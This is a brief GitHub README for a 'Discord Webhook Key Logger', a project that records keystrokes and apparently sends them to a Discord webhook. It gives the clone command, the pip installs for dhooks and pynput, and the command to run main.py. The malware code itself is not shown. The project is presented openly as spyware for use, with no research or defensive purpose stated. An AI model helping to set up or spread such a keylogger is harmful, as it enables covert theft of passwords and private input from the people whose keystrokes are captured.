
# Discord Webhook Key Logger

Just a simple Keylogger with a discord Webhook
## How To Run

Clone the project

```bash
  git clone https://github.com/uwu3lol/Discordkeylogger.git
```

Go to the project directory

Install packages

```bash
    pip install dhooks
    pip install pynput
```

Start the project

```bash
  python main.py
```
